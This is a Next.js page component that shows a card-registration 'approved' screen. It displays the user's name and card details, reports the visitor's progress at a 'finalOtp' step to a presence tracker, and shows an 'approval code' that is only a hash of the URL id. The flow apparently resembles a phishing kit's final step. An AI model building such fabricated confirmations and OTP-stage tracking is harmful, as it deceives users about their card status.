'use client';
import { useEffect, useState, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useLang } from '@/context/LanguageContext';
import { t } from '@/i18n';
import { getRegistration, type Registration } from '@/lib/firebase';
import { trackPresence } from '@/lib/presence';

function genCode(id: string): string {
  if (!id) return '--------';
  let hash = 0;
  for (let i = 0; i < id.length; i++) {
    hash = ((hash << 5) - hash) + id.charCodeAt(i);
    hash |= 0; // Convert to 32-bit integer
  }
  return Math.abs(hash).toString().padStart(8, '0').slice(-8).toUpperCase();
}

function CodeContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { lang } = useLang();
  const T = t[lang].code;

  const id = searchParams?.get('id') ?? '';
  const [reg, setReg] = useState<Registration | null>(null);

  useEffect(() => {
    if (!id) return;
    getRegistration(id)
      .then(data => { if (data) setReg(data); })
      .catch(() => {});
    return trackPresence({ page: 'code', step: 'finalOtp', registrationId: id });
  }, [id]);

  const code = genCode(id);

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden">
        <div className="h-2 w-full" style={{ background: 'linear-gradient(to left, #7a6318, #c9a227)' }} />
        <div className="px-6 py-8 text-center space-y-5">
          <div className="w-20 h-20 rounded-full bg-green-50 border-4 border-green-400 flex items-center justify-center mx-auto">
            <span className="text-green-500 text-4xl font-bold">✓</span>
          </div>
          <div>
            <h2 className="text-2xl font-bold text-gray-900 mb-1">{T.approved}</h2>
            <p className="text-gray-500 text-sm">
              {reg ? `${reg.fullName} — ${reg.brand} ${reg.cardType}` : T.loading}
            </p>
          </div>
          <div className="bg-[#fdf8ec] border-2 border-[#c9a227] rounded-2xl px-6 py-5">
            <p className="text-xs text-gray-500 mb-2">{T.codeLabel}</p>
            <p className="text-4xl font-black tracking-[0.25em] text-[#c9a227] font-sans">{code}</p>
            <p className="text-xs text-gray-400 mt-2">{T.codeNote}</p>
          </div>
          {reg && (
            <div className="text-sm text-gray-600 bg-gray-50 rounded-xl p-4 space-y-1 text-start">
              <p><span className="font-bold">{T.brandLabel}:</span> {reg.brand}</p>
              <p><span className="font-bold">{T.cardLabel}:</span> {reg.cardType}</p>
              <p><span className="font-bold">{T.regionLabel}:</span> {reg.region}</p>
              <p><span className="font-bold">{T.deliveryLabel}:</span> {reg.deliveryDate}</p>
            </div>
          )}
          <button onClick={() => router.push('/')}
            className="w-full bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold py-3.5 rounded-xl transition-colors shadow-sm cursor-pointer">
            {T.btnHome}
          </button>
        </div>
      </div>
    </div>
  );
}

export default function Code() {
  return <Suspense><CodeContent /></Suspense>;
}
